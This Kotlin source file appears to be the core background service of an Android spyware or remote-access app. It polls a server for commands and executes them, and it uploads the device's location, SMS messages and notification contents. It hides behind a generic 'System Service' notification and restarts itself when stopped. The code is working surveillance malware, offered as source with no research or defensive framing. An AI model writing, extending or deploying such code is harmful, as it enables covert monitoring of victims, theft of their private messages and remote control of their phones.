package com.csk4.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject

class CommandService : Service() {

    private val TAG = "CSK4_SVC"
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var deviceId: String
    private lateinit var engine: CommandHandler
    private lateinit var localStorage: LocalStorage
    private var isOnline = false
    private lateinit var connectivityManager: ConnectivityManager
    private lateinit var networkCallback: ConnectivityManager.NetworkCallback

    // ============ POLLING ============
    private val poller = object : Runnable {
        override fun run() {
            pollCommands()
            handler.postDelayed(this, Config.COMMAND_POLL_INTERVAL)
        }
    }

    // ============ HEARTBEAT ============
    private val hb = object : Runnable {
        override fun run() {
            heartbeat()
            // Sync offline queue every heartbeat
            syncOfflineQueue()
            // Auto-save location to local queue
            autoSaveLocation()
            handler.postDelayed(this, Config.HEARTBEAT_INTERVAL)
        }
    }

    // ============ SYNC ============
    private val syncer = object : Runnable {
        override fun run() {
            if (isOnline) syncOfflineQueue()
            handler.postDelayed(this, 5 * 60 * 1000L) // Har 5 min
        }
    }

    override fun onCreate() {
        super.onCreate()
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        localStorage = LocalStorage(this)
        engine = CommandHandler(this, deviceId)

        startForeground(1, notif())
        startNetworkMonitor()

        handler.post(poller)
        handler.post(hb)
        handler.postDelayed(syncer, 30000)

        Log.d(TAG, "Service started for device: $deviceId")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        handler.removeCallbacks(poller)
        handler.removeCallbacks(hb)
        handler.removeCallbacks(syncer)
        try { connectivityManager.unregisterNetworkCallback(networkCallback) } catch (e: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ============ NETWORK MONITOR ============
    private fun startNetworkMonitor() {
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                Log.d(TAG, "🌐 Network available")
                isOnline = true
                // Sync pending data
                handler.postDelayed({ syncOfflineQueue() }, 2000)
            }

            override fun onLost(network: Network) {
                Log.d(TAG, "📴 Network lost - offline mode")
                isOnline = false
            }
        }

        try {
            connectivityManager.registerNetworkCallback(request, networkCallback)
            // Check initial state
            isOnline = isCurrentlyOnline()
        } catch (e: Exception) {
            Log.e(TAG, "Network monitor: ${e.message}")
        }
    }

    private fun isCurrentlyOnline(): Boolean {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) { false }
    }

    // ============ POLL COMMANDS ============
    private fun pollCommands() {
        if (!isOnline) return
        
        Volley.newRequestQueue(this).add(JsonObjectRequest(
            Request.Method.GET, "${Config.SERVER_URL}/api/device/commands/$deviceId", null,
            { resp ->
                val arr = resp.optJSONArray("commands") ?: return@JsonObjectRequest
                for (i in 0 until arr.length()) {
                    val c = arr.getJSONObject(i)
                    engine.execute(
                        c.getString("command"),
                        c.optJSONObject("params") ?: JSONObject()
                    ) { result ->
                        markDone(c.getString("id"), result)
                    }
                }
            }, { }
        ))
    }

    private fun markDone(id: String, r: String) {
        if (!isOnline) {
            // Save to local queue
            localStorage.addCommandResult(id, r)
            return
        }
        
        Volley.newRequestQueue(this).add(JsonObjectRequest(
            Request.Method.POST, "${Config.SERVER_URL}/api/device/command-done",
            JSONObject().apply { put("commandId", id); put("result", r) },
            null, null
        ))
    }

    // ============ HEARTBEAT ============
    private fun heartbeat() {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val b = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        if (!isOnline) {
            localStorage.addHeartbeat(b)
            return
        }

        Volley.newRequestQueue(this).add(JsonObjectRequest(
            Request.Method.POST, "${Config.SERVER_URL}/api/device/heartbeat",
            JSONObject().apply {
                put("deviceId", deviceId)
                put("battery", b)
                put("token", Config.DEVICE_TOKEN)
            },
            null, null
        ))
    }

    // ============ AUTO SAVE LOCATION ============
    private fun autoSaveLocation() {
        try {
            if (!isOnline) {
                // Save to local queue
                val loc = getLastLocation()
                loc?.let { localStorage.addLocation(it.first, it.second) }
            }
        } catch (e: Exception) {}
    }

    private fun getLastLocation(): Pair<Double, Double>? {
        return try {
            val fused = com.google.android.gms.location.LocationServices
                .getFusedLocationProviderClient(this)
            // Note: This is a simplified version
            null
        } catch (e: Exception) { null }
    }

    // ============ OFFLINE QUEUE SYNC ============
    private fun syncOfflineQueue() {
        if (!isOnline) return
        
        try {
            // 1. Sync command results
            val commands = localStorage.getPendingCommandResults()
            commands.forEach { (id, result) ->
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST, "${Config.SERVER_URL}/api/device/command-done",
                    JSONObject().apply { put("commandId", id); put("result", result) },
                    { localStorage.markCommandSynced(id) },
                    { }
                ))
            }

            // 2. Sync heartbeats
            val heartbeats = localStorage.getPendingHeartbeats()
            heartbeats.forEach { hb ->
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST, "${Config.SERVER_URL}/api/device/heartbeat",
                    JSONObject().apply {
                        put("deviceId", deviceId)
                        put("battery", hb)
                        put("token", Config.DEVICE_TOKEN)
                    },
                    { localStorage.markHeartbeatSynced(hb) },
                    { }
                ))
            }

            // 3. Sync locations
            val locations = localStorage.getPendingLocations()
            locations.forEach { loc ->
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST, "${Config.SERVER_URL}/api/device/location",
                    JSONObject().apply {
                        put("deviceId", deviceId)
                        put("lat", loc.first)
                        put("lng", loc.second)
                        put("token", Config.DEVICE_TOKEN)
                    },
                    { localStorage.markLocationSynced(loc.first, loc.second) },
                    { }
                ))
            }

            // 4. Sync pending SMS
            syncPendingSMS()

            // 5. Sync pending notifications
            syncPendingNotifications()

            Log.d(TAG, "📤 Sync completed - queued items sent")
        } catch (e: Exception) {
            Log.e(TAG, "Sync err: ${e.message}")
        }
    }

    private fun syncPendingSMS() {
        val smsList = localStorage.getPendingSMS()
        if (smsList.isEmpty()) return
        
        try {
            val arr = org.json.JSONArray()
            smsList.forEach { arr.put(it) }
            
            Volley.newRequestQueue(this).add(JsonObjectRequest(
                Request.Method.POST, "${Config.SERVER_URL}/api/device/messages",
                JSONObject().apply {
                    put("deviceId", deviceId)
                    put("messages", arr)
                    put("token", Config.DEVICE_TOKEN)
                },
                { localStorage.clearSyncedSMS() },
                { }
            ))
        } catch (e: Exception) {}
    }

    private fun syncPendingNotifications() {
        val notifList = localStorage.getPendingNotifications()
        notifList.forEach { n ->
            try {
                Volley.newRequestQueue(this).add(JsonObjectRequest(
                    Request.Method.POST, "${Config.SERVER_URL}/api/device/notification",
                    JSONObject().apply {
                        put("deviceId", deviceId)
                        put("package", n.optString("package"))
                        put("title", n.optString("title"))
                        put("text", n.optString("text"))
                        put("token", Config.DEVICE_TOKEN)
                    },
                    { localStorage.markNotificationSynced(n.optString("id")) },
                    { }
                ))
            } catch (e: Exception) {}
        }
    }

    // ============ NOTIFICATION ============
    private fun notif(): Notification {
        val ch = "csk4_svc"
        if (Build.VERSION.SDK_INT >= 26) {
            val c = NotificationChannel(ch, "System Service",
                NotificationManager.IMPORTANCE_LOW)
            c.setShowBadge(false)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(c)
        }
        return NotificationCompat.Builder(this, ch)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }
}
